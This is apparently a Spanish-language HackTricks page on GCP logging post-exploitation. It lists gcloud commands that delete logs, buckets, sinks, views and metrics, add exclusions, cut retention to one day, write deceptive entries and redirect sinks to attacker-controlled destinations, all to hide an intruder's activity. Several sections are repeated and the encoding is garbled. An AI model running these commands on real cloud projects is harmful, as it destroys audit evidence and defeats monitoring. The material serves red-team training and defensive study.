# GCP - Logging Post Exploitation

{% hint style="success" %}
Aprende y practica AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprende y practica GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci贸n**](https://github.com/sponsors/carlospolop)!
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Informaci贸n B谩sica

Para m谩s informaci贸n revisa:

{% content-ref url="../gcp-services/gcp-logging-enum.md" %}
[gcp-logging-enum.md](../gcp-services/gcp-logging-enum.md)
{% endcontent-ref %}

Para otras formas de interrumpir la monitorizaci贸n revisa:

{% content-ref url="gcp-monitoring-post-exploitation.md" %}
[gcp-monitoring-post-exploitation.md](gcp-monitoring-post-exploitation.md)
{% endcontent-ref %}

### Registro Predeterminado

**Por defecto no ser谩s atrapado solo por realizar acciones de lectura. Para m谩s informaci贸n revisa la secci贸n de Logging Enum.**

### A帽adir Principal Exceptuado

En [https://console.cloud.google.com/iam-admin/audit/allservices](https://console.cloud.google.com/iam-admin/audit/allservices) y [https://console.cloud.google.com/iam-admin/audit](https://console.cloud.google.com/iam-admin/audit) es posible a帽adir principales para no generar registros. Un atacante podr铆a abusar de esto para evitar ser atrapado.

### Leer registros - `logging.logEntries.list`

{% code overflow="wrap" %}
```bash
# Read logs
gcloud logging read "logName=projects/your-project-id/logs/log-id" --limit=10 --format=json

# Everything from a timestamp
gcloud logging read "timestamp >= \"2023-01-01T00:00:00Z\"" --limit=10 --format=json

# Use these options to indicate a different bucket or view to use: --bucket=_Required  --view=_Default
```
{% endcode %}

### `logging.logs.delete`

{% code overflow="wrap" %}
```bash
# Delete all entries from a log in the _Default log bucket - logging.logs.delete
gcloud logging logs delete <log-name>
```
{% endcode %}

### Escribir logs - `logging.logEntries.create`

{% code overflow="wrap" %}
```bash
# Write a log entry to try to disrupt some system
gcloud logging write LOG_NAME "A deceptive log entry" --severity=ERROR
```
{% endcode %}

### `logging.buckets.update`

{% code overflow="wrap" %}
```bash
# Set retention period to 1 day (_Required has a fixed one of 400days)

gcloud logging buckets update bucketlog --location=<location> --description="New description" --retention-days=1
```
{% endcode %}

### `logging.buckets.delete`

### Descripci贸n

Este permiso permite a un atacante eliminar un bucket de registros. Esto puede ser 煤til para un atacante que quiera eliminar cualquier rastro de sus actividades.

### Ejemplo de uso

```bash
gcloud logging buckets delete [BUCKET_ID]
```

### `logging.sinks.delete`

### Descripci贸n

Este permiso permite a un atacante eliminar un sink de registros. Esto puede ser 煤til para un atacante que quiera detener la exportaci贸n de registros a un destino espec铆fico.

### Ejemplo de uso

```bash
gcloud logging sinks delete [SINK_NAME]
```

### `logging.logs.delete`

### Descripci贸n

Este permiso permite a un atacante eliminar registros espec铆ficos. Esto puede ser 煤til para un atacante que quiera eliminar registros espec铆ficos que puedan contener evidencia de sus actividades.

### Ejemplo de uso

```bash
gcloud logging logs delete [LOG_NAME]
```

### `logging.exclusions.create`

### Descripci贸n

Este permiso permite a un atacante crear exclusiones de registros. Esto puede ser 煤til para un atacante que quiera excluir ciertos registros de ser almacenados.

### Ejemplo de uso

```bash
gcloud logging exclusions create [EXCLUSION_NAME] --filter="[FILTER]"
```

### `logging.exclusions.delete`

### Descripci贸n

Este permiso permite a un atacante eliminar exclusiones de registros. Esto puede ser 煤til para un atacante que quiera revertir cualquier exclusi贸n de registros previamente creada.

### Ejemplo de uso

```bash
gcloud logging exclusions delete [EXCLUSION_NAME]
```

### `logging.exclusions.update`

### Descripci贸n

Este permiso permite a un atacante actualizar exclusiones de registros. Esto puede ser 煤til para un atacante que quiera modificar las exclusiones de registros existentes.

### Ejemplo de uso

```bash
gcloud logging exclusions update [EXCLUSION_NAME] --filter="[NEW_FILTER]"
```
```bash
# Delete log bucket
gcloud logging buckets delete BUCKET_NAME --location=<location>
```
### `logging.links.delete`

{% code overflow="wrap" %}
```bash
# Delete link
gcloud logging links delete <link-id> --bucket <bucket> --location <location>
```
{% endcode %}

### `logging.views.delete`

### Descripci贸n

Este permiso permite a un atacante eliminar vistas de registros en un proyecto de GCP. Las vistas de registros son filtros que determinan qu茅 registros se pueden ver en un bucket de registros. Al eliminar una vista, un atacante puede ocultar sus actividades maliciosas.

### Impacto

- Ocultar actividades maliciosas al eliminar vistas de registros.
- Dificultar la detecci贸n de incidentes de seguridad.

### Mitigaci贸n

- Restringir el uso del permiso `logging.views.delete` solo a usuarios de confianza.
- Implementar monitoreo y alertas para detectar la eliminaci贸n de vistas de registros.

### Ejemplo de uso

```bash
gcloud logging views delete VIEW_NAME --bucket=BUCKET_NAME --location=LOCATION
```

### Referencias

- [Documentaci贸n de GCP sobre vistas de registros](https://cloud.google.com/logging/docs/view/logs-views)

{% endcode %}
```bash
# Delete a logging view to remove access to anyone using it
gcloud logging views delete <view-id> --bucket=<bucket> --location=global
```
### `logging.views.update`

{% code overflow="wrap" %}
```bash
# Update a logging view to hide data
gcloud logging views update <view-id> --log-filter="resource.type=gce_instance" --bucket=<bucket> --location=global --description="New description for the log view"
```
{% endcode %}

### `logging.logMetrics.update`

{% code overflow="wrap" %}
```bash
# Update log based metrics - logging.logMetrics.update
gcloud logging metrics update <metric-name> --description="Changed metric description" --log-filter="severity>CRITICAL" --project=PROJECT_ID
```
{% endcode %}

### `logging.logMetrics.delete`

### Descripci贸n

Permite a los atacantes eliminar m茅tricas de registro personalizadas. Esto puede ser 煤til para ocultar actividades maliciosas que se han registrado.

### Ejemplo de uso

```bash
gcloud logging metrics delete [NOMBRE_METRICA]
```

### `logging.logMetrics.update`

### Descripci贸n

Permite a los atacantes actualizar m茅tricas de registro personalizadas. Esto puede ser 煤til para modificar o falsificar datos de registro.

### Ejemplo de uso

```bash
gcloud logging metrics update [NOMBRE_METRICA] --config-from-file=[ARCHIVO_CONFIGURACION]
```

### `logging.sinks.delete`

### Descripci贸n

Permite a los atacantes eliminar sumideros de registro. Esto puede ser 煤til para detener la exportaci贸n de registros a destinos externos, ocultando as铆 actividades maliciosas.

### Ejemplo de uso

```bash
gcloud logging sinks delete [NOMBRE_SUMIDERO]
```

### `logging.sinks.update`

### Descripci贸n

Permite a los atacantes actualizar sumideros de registro. Esto puede ser 煤til para redirigir registros a destinos controlados por el atacante.

### Ejemplo de uso

```bash
gcloud logging sinks update [NOMBRE_SUMIDERO] --destination=[NUEVO_DESTINO]
```

### `logging.logs.delete`

### Descripci贸n

Permite a los atacantes eliminar registros espec铆ficos. Esto puede ser 煤til para borrar evidencia de actividades maliciosas.

### Ejemplo de uso

```bash
gcloud logging logs delete [NOMBRE_REGISTRO]
```

### `logging.exclusions.create`

### Descripci贸n

Permite a los atacantes crear exclusiones de registro. Esto puede ser 煤til para evitar que ciertas actividades sean registradas.

### Ejemplo de uso

```bash
gcloud logging exclusions create [NOMBRE_EXCLUSION] --filter=[FILTRO]
```

### `logging.exclusions.delete`

### Descripci贸n

Permite a los atacantes eliminar exclusiones de registro. Esto puede ser 煤til para restaurar el registro de actividades previamente excluidas.

### Ejemplo de uso

```bash
gcloud logging exclusions delete [NOMBRE_EXCLUSION]
```

### `logging.exclusions.update`

### Descripci贸n

Permite a los atacantes actualizar exclusiones de registro. Esto puede ser 煤til para modificar los criterios de exclusi贸n de registros.

### Ejemplo de uso

```bash
gcloud logging exclusions update [NOMBRE_EXCLUSION] --filter=[NUEVO_FILTRO]
```
```bash
# Delete log based metrics - logging.logMetrics.delete
gcloud logging metrics delete <metric-name>
```
### `logging.sinks.delete`

El permiso `logging.sinks.delete` permite a un atacante eliminar registros de auditor铆a, lo que puede ayudar a ocultar sus actividades.
```bash
# Delete sink - logging.sinks.delete
gcloud logging sinks delete <sink-name>
```
### `logging.sinks.update`

{% code overflow="wrap" %}
```bash
# Disable sink - logging.sinks.update
gcloud logging sinks update <sink-name> --disabled

# Createa filter to exclude attackers logs - logging.sinks.update
gcloud logging sinks update SINK_NAME --add-exclusion="name=exclude-info-logs,filter=severity<INFO"

# Change where the sink is storing the data - logging.sinks.update
gcloud logging sinks update <sink-name> new-destination

# Change the service account to one withuot permissions to write in the destination - logging.sinks.update
gcloud logging sinks update SINK_NAME --custom-writer-identity=attacker-service-account-email --project=PROJECT_ID

# Remove explusions to try to overload with logs - logging.sinks.update
gcloud logging sinks update SINK_NAME --clear-exclusions

# If the sink exports to BigQuery, an attacker might enable or disable the use of partitioned tables, potentially leading to inefficient querying and higher costs. - logging.sinks.update
gcloud logging sinks update SINK_NAME --use-partitioned-tables
gcloud logging sinks update SINK_NAME --no-use-partitioned-tables
```
{% endcode %}

{% hint style="success" %}
Aprende y practica AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprende y practica GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya HackTricks</summary>

* Revisa los [**planes de suscripci贸n**](https://github.com/sponsors/carlospolop)!
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
